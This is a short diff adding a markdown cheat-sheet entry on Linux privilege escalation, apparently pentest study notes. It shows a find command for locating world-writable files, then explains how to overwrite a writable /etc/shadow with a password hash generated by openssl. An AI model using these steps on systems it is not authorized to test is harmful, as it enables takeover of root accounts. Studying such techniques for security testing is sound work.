@@ -1,0 +1,33 @@
+#### Privilege Escalation : Linux
+
+
+
+The following command will look for files (and not symlinks etc) which is world writable
+
+```
+find / -not -type l -perm -o+w
+```
+
+Example : the /etc/shadow file is writable
+
+###### Generate hash and paste the outpout in /etc/shadow pas
+
+```
+openssl passwd -1 -salt abc password
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
